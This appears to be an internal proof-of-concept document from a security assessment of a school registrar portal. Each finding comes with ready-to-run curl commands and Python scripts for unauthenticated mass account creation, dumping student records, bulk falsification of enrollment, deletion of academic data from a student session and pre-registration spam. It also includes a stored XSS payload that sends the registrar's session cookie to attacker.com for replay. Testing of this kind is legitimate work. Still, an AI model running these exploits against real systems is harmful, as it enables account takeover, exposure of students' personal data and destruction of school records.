# Registrar Portal — Proof of Concept (PoC)
**Date:** June 6, 2026  
**Classification:** Internal — Restricted  
**Purpose:** Demonstrate exploitability of confirmed vulnerabilities

> **Usage Policy:** These PoCs are for internal assessment purposes only. Replace `http://app.local` with the actual application URL in your test environment. Do not run against production systems without written authorization.

---

## PoC-R-01 — Unauthenticated Mass Account Creation

**Finding:** R-01 (CRITICAL)  
**Route:** `GET /fixAccountConflict`  
**Middleware:** None  
**Expected Result:** User accounts created for all students missing one (password = `123456`)

### Step 1 — Enumerate Student IDs (via R-02)
```bash
# No auth required. Returns a full HTML page listing all student account conflicts.
curl -s "http://app.local/studentUserDebugger" | grep -o 'studentid":[0-9]*' | sort -u
```

The page renders a Bootstrap table with columns: student name, student ID (`sid`), user email, and account status flags (NSA = No Student Account, NPA = No Parent Account).

### Step 2 — Trigger Mass Account Creation
```bash
# No auth required.
# For every student with NSA=true, inserts: email='S<sid>', password=Hash('123456'), type=7
# For every student with NPA=true, inserts: email='P<sid>', password=Hash('123456'), type=9
curl -s "http://app.local/fixAccountConflict"
```

**Expected response:** HTML view with an account summary. No error response on success.

### Step 3 — Log in as a Student
```bash
# Replace SID with any student ID obtained from Step 1
# Default password for all created accounts is 123456
curl -s -c cookies.txt -b cookies.txt \
  -X POST "http://app.local/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=$(curl -s http://app.local/login | grep -oP 'csrf-token" content="\K[^"]*')" \
  --data-urlencode "email=S1001" \
  --data-urlencode "password=123456"

# Check if authenticated
curl -s -b cookies.txt "http://app.local/studentdashboard" | grep -i "dashboard"
```

### Step 4 — Access Student Portal
```bash
# With valid session, access grades, billing, class schedule
curl -s -b cookies.txt "http://app.local/student/grades"
curl -s -b cookies.txt "http://app.local/student/billing/summary"
```

**Proof of Exploitation:** A `200 OK` response on `/studentdashboard` with student name in the HTML body confirms the account was created and login succeeded.

### Remediation Verification
After applying the fix (adding `isAdmin` middleware), the endpoint should return `302 Redirect` to login or dashboard, not execute the account creation logic:
```bash
curl -v "http://app.local/fixAccountConflict" 2>&1 | grep "< HTTP/"
# Expected: HTTP/1.1 302 Found (redirect to /login)
```

---

## PoC-R-02 — Unauthenticated Student Database Enumeration

**Finding:** R-02 (CRITICAL)  
**Route:** `GET /studentUserDebugger`  
**Middleware:** None  
**Expected Result:** Full active student list with IDs and account status

```bash
# Dump all student IDs, names, and account flags without any login
curl -s "http://app.local/studentUserDebugger" \
  | grep -oE '(S|P)[0-9]+|[A-Z][a-z]+ [A-Z][a-z]+' \
  | head -50
```

**Alternative — extract structured data with Python:**
```python
import requests
from bs4 import BeautifulSoup

r = requests.get("http://app.local/studentUserDebugger")
soup = BeautifulSoup(r.text, "html.parser")

# Table rows contain student data
rows = soup.select("table tbody tr")
for row in rows:
    cells = row.find_all("td")
    if cells:
        print(f"SID: {cells[0].text.strip()}, Name: {cells[1].text.strip()}, NSA: {cells[3].text.strip()}")
```

**Expected output:**
```
SID: 1001, Name: Juan Dela Cruz,    NSA: true
SID: 1002, Name: Maria Santos,      NSA: false
SID: 1003, Name: Pedro Reyes,       NSA: true
...
```

---

## PoC-R-03 — Unauthenticated Enrollment Record Manipulation

**Finding:** R-03 (HIGH)  
**Routes:** `GET /early/enrollment/submit`, `GET /pre/enrollment/submit`  
**Middleware:** None

### 3a — Mark Any Student as Pre-Enrolled
```bash
# Sets studinfo.preEnrolled = 1 for student ID 42
# No authentication required
curl -s "http://app.local/pre/enrollment/submit?studid=42"

# Expected response:
# [{"status":1,"data":"Submitted Successfully!"}]
```

### 3b — Insert False Early Enrollment Record
```bash
# Creates an earlybirds record for student 42
# syid=1 (school year), semid=1 (semester), levelid=7 (Grade 11)
curl -s "http://app.local/early/enrollment/submit?studid=42&syid=1&semid=1&levelid=7"

# Expected response:
# [{"status":1,"data":"Submitted Successfully"}]
```

### 3c — Bulk Manipulation Script
```bash
#!/bin/bash
# Mark students 1000-1100 as all pre-enrolled
for SID in $(seq 1000 1100); do
    curl -s "http://app.local/pre/enrollment/submit?studid=$SID" &
done
wait
echo "Done — 100 students falsely marked as pre-enrolled"
```

**Verification (from database):**
```sql
SELECT id, firstname, lastname, preEnrolled 
FROM studinfo 
WHERE id = 42;
-- preEnrolled should be 1

SELECT * FROM earlybirds WHERE studid = 42;
-- Should show the inserted record
```

---

## PoC-R-04 — Privilege Escalation: Student Deletes Academic Configuration

**Finding:** R-04 (HIGH)  
**Routes:** All `/registrarv2/*` routes  
**Middleware:** `auth` only (no `isRegistrar`)

### Prerequisite: Get a Student Session
Using PoC-R-01 to obtain a student session, or log in normally as any valid user.

```bash
# Assuming cookies.txt holds a valid student session from any portal
# (student, teacher, parent, cashier — any authenticated user works)

# Test — read college list (should succeed for student)
curl -s -b cookies.txt "http://app.local/registrarv2/setup/higher-education/colleges"
# Expected: 200 OK with JSON college list

# Destructive — delete college ID 1
curl -s -b cookies.txt \
  -X DELETE \
  "http://app.local/registrarv2/setup/higher-education/colleges/1"
# Expected (before fix): 200 OK — college deleted
# Expected (after fix): 403 Forbidden or redirect

# Destructive — delete grading setup
curl -s -b cookies.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"id": 1}' \
  "http://app.local/registrarv2/grading-setup/delete"
# Expected (before fix): 200 OK

# Destructive — delete a subject from curriculum prospectus
curl -s -b cookies.txt \
  -X DELETE \
  "http://app.local/registrarv2/setup/higher-education/prospectus/1/delete"
# Expected (before fix): 200 OK — subject permanently removed from curriculum
```

**Evidence required for report:**
- Screenshot or response body showing `200 OK` on DELETE from student session
- Database query showing the deleted record is gone

---

## PoC-R-05 — Stored XSS via Student Name in Registrar Search

**Finding:** R-05 (HIGH)  
**Attack entry:** Public pre-registration form at `GET /prereg/newstudent`  
**Trigger:** Registrar performs a student search  
**Victim:** Registrar staff member

### Step 1 — Inject Payload via Public Pre-Registration
```bash
# Get CSRF token from the public pre-registration form
TOKEN=$(curl -s "http://app.local/prereg/newstudent" | grep -oP 'name="_token" value="\K[^"]*')

# Submit pre-registration with XSS in firstname field
curl -s -X POST "http://app.local/storeprereg/newstudent" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "firstname=<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>" \
  --data-urlencode "lastname=Smith" \
  --data-urlencode "gender=M" \
  --data-urlencode "levelid=1" \
  --data-urlencode "gradeSection=1"
```

### Step 2 — Wait for Registrar to Search
When the registrar uses the student search (`/registrar/studentinfo/search`), the following HTML is rendered in their browser:

```html
<!-- What RegistrarFunctionController@studentsearch() outputs: -->
<td>
  <a href="studentinfo/edit/999">
    <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)> Smith
  </a>
</td>
```

The `onerror` handler executes when `img src=x` fails to load (immediately). The registrar's session cookie is sent to `attacker.com`.

### Step 3 — Session Hijack
```bash
# On attacker server, receive the cookie
# Then replay it as the registrar:
curl -s -b "laravel_session=<stolen_cookie>" \
  "http://app.local/registrardashboard"
# Full registrar portal access
```

### Safe Payload for Testing (No Exfiltration)
```
firstname = <script>alert('XSS-R05-CONFIRMED')</script>
```
Observe an `alert()` box when the registrar performs a student search containing this name.

---

## PoC-R-06 — Pre-Registration Spam (No Rate Limiting)

**Finding:** R-06 (MEDIUM)  
**Route:** `GET /storeprereg/{studentstatus}`  
**Middleware:** None  
**Expected Result:** Database flooded with fake pre-registrations

```python
#!/usr/bin/env python3
"""
PoC-R-06: Pre-registration spam — no rate limiting or CAPTCHA
Sends 100 fake pre-registrations in under 30 seconds.
"""
import requests
import random
import string

BASE = "http://app.local"
session = requests.Session()

# Get CSRF token
r = session.get(f"{BASE}/prereg/newstudent")
import re
token = re.search(r'name="_token" value="([^"]+)"', r.text)
token = token.group(1) if token else ""

fake_names = [
    ("Juan", "Dela Cruz"), ("Maria", "Santos"), ("Pedro", "Reyes"),
    ("Ana", "Garcia"), ("Jose", "Lopez"), ("Carmen", "Torres")
]

for i in range(100):
    first, last = random.choice(fake_names)
    r = session.post(f"{BASE}/storeprereg/newstudent", data={
        "_token"     : token,
        "firstname"  : f"{first}{''.join(random.choices(string.digits, k=4))}",
        "lastname"   : last,
        "gender"     : "M",
        "levelid"    : "1",
        "gradeSection": "1"
    })
    if r.status_code == 200:
        print(f"[{i+1}] Submitted")

print("Done — 100 fake pre-registrations submitted. Check preregistration table.")
```

**Expected SQL result:**
```sql
SELECT COUNT(*) FROM preregistration WHERE DATE(created_at) = CURDATE();
-- Should show 100+ records created today
```

---

## PoC-R-07 — Debug Endpoint Inserts Test Records (Authenticated)

**Finding:** R-07 (MEDIUM)  
**Prerequisite:** Valid registrar account  
**Route:** `GET /registrar/insert/students/sf10`

```bash
# Login as registrar first, then:
curl -s -b cookies.txt "http://app.local/registrar/insert/students/sf10"
# Inserts SF10 grade records for hardcoded studid=75
# with schoolname='SOUTH CITY CENTRAL SCHOOL'

# Verify the pollution:
# (Database query required)
# SELECT * FROM sf10_student_elem WHERE studid = 75 ORDER BY created_at DESC LIMIT 5;
```

---

## Summary of PoC Results

| PoC | Expected Before Fix | Expected After Fix |
|---|---|---|
| PoC-R-01 | Account created, login succeeds with `123456` | `302` redirect to `/login` |
| PoC-R-02 | Full student list rendered (no login) | `302` redirect to `/login` |
| PoC-R-03a | `{"status":1,"data":"Submitted Successfully!"}` | `401 Unauthorized` |
| PoC-R-03b | `{"status":1,"data":"Submitted Successfully"}` | `401 Unauthorized` |
| PoC-R-04 | `200 OK` — record deleted from student session | `403 Forbidden` |
| PoC-R-05 | `alert()` or cookie exfiltration triggered | None — HTML escaped |
| PoC-R-06 | 100 records inserted in DB | `429 Too Many Requests` after 5–10 attempts |
| PoC-R-07 | Test records inserted for studid=75 | Route removed or returns `404` |

---

*End of Registrar Portal PoC Document*
